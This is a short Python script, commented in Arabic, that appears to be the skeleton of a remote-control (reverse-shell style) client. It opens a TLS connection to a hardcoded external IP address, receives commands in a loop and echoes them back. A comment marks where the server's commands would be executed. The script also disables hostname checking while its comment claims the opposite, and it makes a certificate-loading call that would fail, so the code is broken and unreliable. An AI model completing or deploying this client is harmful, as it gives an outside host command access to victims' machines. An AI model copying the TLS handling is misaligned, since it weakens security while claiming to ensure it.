import socket
import ssl

# إعدادات السيرفر
SERVER_IP = '178.62.237.181'  # استبدلها بعنوان السيرفر
SERVER_PORT = 9999

def main():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((SERVER_IP, SERVER_PORT))

        # استخدام SSLContext بدلاً من wrap_socket
        context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
        context.check_hostname = False  # للتأكد من الاتصال بالخادم الصحيح
        context.load_verify_locations(cafile=None)  # يمكنك تحديد ملف الشهادة الجذرية إذا لزم الأمر
        s = context.wrap_socket(s, server_side=False)

    except Exception as e:
        print(f"Connection failed: {e}")
        return

    while True:
        try:
            data = s.recv(1024)
            if not data:
                break

            command = data.decode("utf-8", errors="ignore")
            print(command)
            # تنفيذ الأوامر المرسلة من السيرفر هنا ...

            s.send(command.encode())

        except Exception as e:
            print(f"Error: {e}")
            break

    s.close()

if __name__ == '__main__':
    main()
